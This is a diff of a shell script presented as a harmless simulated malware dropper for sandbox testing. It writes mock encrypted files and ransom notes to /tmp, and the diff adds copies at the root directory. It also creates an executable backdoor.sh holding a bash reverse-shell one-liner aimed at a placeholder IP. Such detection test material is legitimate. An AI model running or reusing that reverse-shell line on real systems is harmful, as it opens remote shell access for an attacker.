@@ -2,15 +2,20 @@
 # SIMULATED MALWARE DROPPER (Harmless simulation for sandbox analysis)
 echo "[*] Initializing simulated payload..."
 
-# 1. Simulate dropping an encrypted payload and ransom note in /tmp
+# 1. Simulate dropping an encrypted payload and ransom note in /tmp and /
 mkdir -p /tmp/.hidden_beacon
+echo "MOCK_ENCRYPTED_DATA_BASE64_ABC123==" > /tmp/encrypted_user_data.lock
 echo "MOCK_ENCRYPTED_DATA_BASE64_ABC123==" > /tmp/.hidden_beacon/encrypted_user_data.lock
 cat << 'EOF' > /tmp/README_RESTORE_FILES.txt
 YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
 This is a harmless test artifact created inside a Cloud Run Sandbox.
 EOF
+cat << 'EOF' > /README_RESTORE_FILES.txt
+YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
+This is a harmless test artifact created inside a Cloud Run Sandbox.
+EOF
 
-# 2. Attempt persistence script creation in /etc or /tmp
+# 2. Attempt persistence script creation in /tmp
 echo "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1" > /tmp/.hidden_beacon/backdoor.sh
 chmod +x /tmp/.hidden_beacon/backdoor.sh
 
